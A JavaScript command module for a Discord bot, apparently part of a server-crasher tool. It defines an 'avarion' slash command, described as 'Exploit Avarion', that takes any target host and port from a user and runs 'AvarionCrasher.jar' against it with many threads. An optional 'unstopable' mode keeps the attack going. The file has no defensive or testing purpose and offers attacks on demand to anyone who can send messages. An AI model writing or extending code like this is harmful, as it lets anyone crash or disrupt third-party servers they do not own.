/** format */

const Command = require('../structure/command.js');
const threads = require('../jsons/threads.json');
const Attack = require('../structure/attack.js');
const crashers = require('../functions/crashers.js');
const config = require('../jsons/config.json');
const Discord = require('discord.js');

module.exports = new Command({
    name: "avarion",
    description: "Exploit Avarion",
    permissions: "SEND_MESSAGES",
    disableOnAttack: true,
    slashCommandOptions: [{
        name: "host",
        type: Discord.ApplicationCommandOptionType.String,
        description: "Enter host or ip server",
        required: true
    }, {
        name: "port",
        description: "Enter port server",
        type: Discord.ApplicationCommandOptionType.Number,
        required: false
    }, {
        name: "unstopable",
        description: "Unstopable testing",
        type: Discord.ApplicationCommandOptionType.Boolean,
        required: false
    }],
    async execute(client, args, interaction){
        let host = args.getString("host");
        let port = args.getNumber("port") || null;
        const unstop = args.getBoolean("unstopable") || false;

        interaction.deferReply({fetchReply: true}).then((msg) => {
            const attack = new Attack({
                jaroptions: {
                    jarname: "AvarionCrasher.jar",
                    jarargs: `host-%HOST% port-%PORT% threads-${threads.avarion}`
                },
                client: client,
                interaction: interaction,
                msgID: msg.id,
                AttacksArray: client.attacks,
                method: "AvarionCrasher 💥",
                host: host,
                port: `${port}`,
                unstopable: unstop,
                ownerID: interaction.user.id
            })
    
            client.attacks.set(msg.id, attack);
        })
    }
});